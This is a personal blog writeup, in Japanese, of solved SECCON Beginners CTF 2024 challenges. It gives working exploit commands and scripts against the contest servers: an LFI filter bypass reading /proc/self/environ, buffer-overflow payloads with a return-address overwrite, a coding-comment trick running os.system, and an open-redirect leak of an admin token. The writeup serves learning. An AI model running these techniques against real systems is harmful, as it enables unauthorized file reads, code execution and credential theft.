---
title: SECCON Beginners CTF 2024 writeup
date: "2024-06-16T22:00:00+09:00"
description: ""
ulid: 01J0GJ4540APFMGEGP7VG5H2Z3
tags:
  - security
  - random
---

今年も...って思ったら多分2021以来まともに参加していなかった。

671点の119位で、solve数は2021よりも上回ったものの、自分が解いたものの中だと多分pwnの2問あたりはかなり難易度が低かった。
あとChatGPTに助けられた問題もあったので、より何ともである...。

## web: ssrforlfi

Pythonの`subprocess.run`によるcurlコマンド呼び出し処理のあるアプリケーションで、環境変数にセットされたフラグを読み出す問題だった。

`https://ssrforlfi.beginners.seccon.games/?url=http://example.com`のようにすると、urlパラメータで与えたURLにアクセスし、レスポンスを表示してくれる。

入力値バリデーションには次の正規表現が用いられていた。

```python
# Allow only a-z, ", (, ), ., /, :, ;, <, >, @, |

if not re.match('^[a-z"()./:;<>@|]*$', url):
	return "Invalid URL ;("
```

また、URLのアクセス処理があり、実装は`subprocess.run`によるcurlコマンドの呼び出しとなっている。

```python
proc = subprocess.run(
	f"curl '{url}'",
	capture_output=True,
	shell=True,
	text=True,
	timeout=1,
)
```

初手何らかの方法でシングルクォートを抜け出してRCEを狙う方法を考えたが、入力値バリデーションによりシングルクォートは入力できないので諦めた（[PythonのREバイパス手法もある](https://www.secjuice.com/python-re-match-bypass-technique/)ようだが、今回は行頭行末指定があるので無理だとなった）。

となると残りはSSRFかLFIのどちらかになる。知る限りSSRFを用いてもフラグの読み出しは難しいだろうとなり、LFIの線で試した。

LFIに対するバリデーションは次のような処理になっている。

```python
elif url.startswith("file://"):
	path = url[7:]
	if os.path.exists(path) or ".." in path:
		return "Detected LFI ;("
```

curlが解釈できるURLの形式かつ`file://`以降がPythonの`os.path.exists()`では解釈できない（これが`False`を返す）ようなURLが必要になる。

`file`URIスキームはホスト名にlocalhostを指定可能であり、たとえば`file:///etc/hosts`は`file://localhost/etc/hosts`と表現できる。

`file://localhost/etc/hosts`をLFIのバリデーションに通すと、`os.path.exists("localhost/etc/hosts")`のようになり存在しないパスと解釈されるため、このバリデーション処理をバイパスすることができる。

任意のファイルを参照できることがわかり、さらにdocker-compose.ymlからフラグは環境変数にロードされていることがわかるので、[`/proc/self/environ`を参照すれば](https://blog.hamayanhamayan.com/entry/2021/12/08/220449)フラグが得られる。

```
▶ curl -s 'https://ssrforlfi.beginners.seccon.games/?url=file://localhost/proc/self/environ' | rg --text -o --regexp 'ctf4b\{.*\}'
ctf4b{1_7h1nk_bl0ck3d_b07h_55rf_4nd_lf1}
```

curlのWarningが攻撃対象サーバー側で起きていると勘違いしていて、余計な時間を食ってしまった。

```
Warning: Binary output can mess up your terminal. Use "--output -" to tell
Warning: curl to output it to your terminal anyway, or consider "--output
Warning: <FILE>" to save to a file.
```

`file://localhost/etc/hosts`のような表現方法があること、環境変数をファイル参照から取得できることは知らなかったので勉強になった。

### pwnable: simpleoverflow

正直のところ原理をちゃんと理解しておらず完全に雰囲気だが、適当に文字をぶっこんでオーバーフローさせた。

```
▶ python3 -c "print('A'*10)" | nc simpleoverflow.beginners.seccon.games 9000
name:Hello, AAAAAAAAAA

ctf4b{0n_y0ur_m4rk}
```

### pwnable: simpleoverwrite

こちらも正直のところ原理を理解しておらず雰囲気だが、`main`関数のリターンアドレスを`win`関数のアドレスで書き換えればいいということだけは文字として知っているので、それっぽいことをした。

とりあえず、objdumpで`win`関数のアドレスを調べる。

```
objdump -d ./chall | grep win
0000000000401186 <win>:
```

オーバーライトに必要な文字数がよくわかっていないが、雑に試したら通ったのでヨシ。

```sh
#!/bin/bash

# solve.sh
for ((i = 2; i <= 30; i++)); do
    python3 -c "print('A' * $i + '\x86\x11\x40\x00\x00\x00\x00\x00')" | nc simpleoverwrite.beginners.seccon.games 9001
done
```

```
▶ ./solve.sh
...
input:Hello, AAAAAAAAAAAAAAAAA@
return to: 0x401186
ctf4b{B3l13v3_4g41n}
...
```

### reversing: cha-ll-enge

LLVMのIRファイルとやらであることだけわかった。

~~のこりはChatGPTに頼んだ~~

### misc: getRank

parseInt可能で文字長が`10 ** 255`よりも大きい値を用意するとフラグが取れるアプリで、ざっくり次の2つの条件を同時に満たす必要がある。

1. `入力値.length > 300`
2. `parseInt(入力値) > 10 ** 255`

可能な限り大きな数字を用意すればいいのだが、2を満たそうとすると1を満たせなくなってしまう。

[JavaScriptの`parseInt`は引数が`0x`で始まる場合、16進数でも10進数と同様に評価ができる](https://es5.github.io/#x15.1.2.2)ため、16進数表記の文字列長がなるべく300に近くなるように調整したところ、フラグが得られた。

> If radix is undefined or 0, it is assumed to be 10 except when the number begins with the character pairs 0x or 0X, in which case a radix of 16 is assumed.
> https://es5.github.io/#x15.1.2.2

```python
import http.client
import json

host = 'getrank.beginners.seccon.games'
headers = { "content-type": "application/json" }
payload = hex(10**350)
body = json.dumps({ "input": payload })

print(payload)
print(len(payload))

conn = http.client.HTTPSConnection(host)
conn.request("POST", "/", body=body, headers=headers)
response = conn.getresponse()

print(response.read().decode())

conn.close()
```

### misc: clamre

フラグを検知するClamAVのシグネチャが渡されているので、[regex101で人力解読した](https://regex101.com/r/F1RsXr/1)。

![](./2024.1718512665402.png)

PCREにおいて`\1`などがグループマッチ箇所を意味することを知らなかった。

### misc: commentator

[Pythonのエンコーディング指定によるコメント行の実行](https://ctftime.org/writeup/28814)なるものを見つけたので、これを試したらフラグが得られた。

```
▶ nc commentator.beginners.seccon.games 4444
                                          _        _                  __
  ___ ___  _ __ ___  _ __ ___   ___ _ __ | |_ __ _| |_ ___  _ __   _  \ \
 / __/ _ \| '_ ` _ \| '_ ` _ \ / _ \ '_ \| __/ _` | __/ _ \| '__| (_)  | |
| (_| (_) | | | | | | | | | | |  __/ | | | || (_| | || (_) | |     _   | |
 \___\___/|_| |_| |_|_| |_| |_|\___|_| |_|\__\__,_|\__\___/|_|    (_)  | |
                                                                      /_/
---------------------------------------------------------------------------
Enter your Python code (ends with __EOF__)
>>> # coding: raw_unicode_escape
>>> \u000aimport os
>>> \u000aos.system("ls -laF /")
>>> __EOF__
...
-rw-r--r--   1 nobody nogroup   50 Jun 14 11:03 flag-437541b5d9499db505f005890ed38f0e.txt
...
thx :)

▶ nc commentator.beginners.seccon.games 4444
                                          _        _                  __
  ___ ___  _ __ ___  _ __ ___   ___ _ __ | |_ __ _| |_ ___  _ __   _  \ \
 / __/ _ \| '_ ` _ \| '_ ` _ \ / _ \ '_ \| __/ _` | __/ _ \| '__| (_)  | |
| (_| (_) | | | | | | | | | | |  __/ | | | || (_| | || (_) | |     _   | |
 \___\___/|_| |_| |_|_| |_| |_|\___|_| |_|\__\__,_|\__\___/|_|    (_)  | |
                                                                      /_/
---------------------------------------------------------------------------
Enter your Python code (ends with __EOF__)
>>> # coding: raw_unicode_escape
>>> \u000aimport os
>>> \u000aos.system("cat /flag-437541b5d9499db505f005890ed38f0e.txt")
>>> __EOF__
ctf4b{c4r3l355_c0mm3n75_c4n_16n173_0nl1n3_0u7r463}thx :)
```

### web: wooorker

adminがトークンを持った状態で歩き回る。

リダイレクトのURLが制御されていないので、ログが読める適当なパブリックなエンドポイントを用意すればいい。（初手ngrokで試したけど一生クローラーからトークンが帰ってこなくて間違っているのかと思い、solveが滑り込みになった）

![](./2024.1718524375637.png)

調べたらRequestBinが良さそうだったので採用。

![](./2024.1718524442751.png)

```
▶ curl 'https://wooorker.beginners.seccon.games/flag' -H 'authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzE4NTI0MDg5LCJleHAiOjE3MTg1Mjc2ODl9.CoRnOxkyUsf_Vr8JQEs9rdoJwtxh5Bdqh02yKOsI6wA'

{"flag":"ctf4b{0p3n_r3d1r3c7_m4k35_70k3n_l34k3d}"}
```
